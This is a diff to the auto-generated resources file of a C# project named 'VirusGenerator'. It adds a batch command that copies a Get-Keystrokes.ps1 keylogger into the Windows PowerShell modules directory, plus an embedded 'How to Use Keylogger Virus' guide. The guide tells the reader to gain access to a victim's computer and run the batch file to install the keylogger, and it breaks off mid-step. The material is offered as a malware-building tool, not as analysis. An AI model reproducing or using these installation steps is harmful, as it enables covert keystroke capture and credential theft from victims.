@@ -61,6 +61,16 @@ namespace VirusGenerator.Properties {
         }
         
         /// <summary>
+        ///   Looks up a localized string similar to @echo off
+        ///copy Get-Keystrokes.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\Modules.
+        /// </summary>
+        internal static string copyKeylogger {
+            get {
+                return ResourceManager.GetString("copyKeylogger", resourceCulture);
+            }
+        }
+        
+        /// <summary>
         ///   Looks up a localized string similar to function Get-Keystrokes {
         ///&lt;#
         ///.SYNOPSIS
@@ -84,6 +94,36 @@ namespace VirusGenerator.Properties {
         internal static string Get_Keystrokes {
             get {
                 return ResourceManager.GetString("Get_Keystrokes", resourceCulture);
+            }
+        }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to 
+        ///
+        ///########################################
+        ///#      How to Use Keylogger Virus      #
+        ///########################################
+        ///
+        ///
+        ///When generated Troy will create several files in a folder called &apos;Get-Keystrokes&apos;.
+        ///
+        ///They should include:
+        ///
+        ///1. Keylogger file
+        ///2. copy.bat 
+        ///3. This help guide.
+        ///
+        ///
+        ///What you need to do is:
+        ///
+        ///1. Get access to the victim&apos;s computer.
+        ///2. Copy the folder to the Deskop.
+        ///3. Run the batch file which will copy the keylogger to the powershell directory on the drive.
+        ///4. Run a com [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string readmeKeylogger {
+            get {
+                return ResourceManager.GetString("readmeKeylogger", resourceCulture);
             }
         }
     }
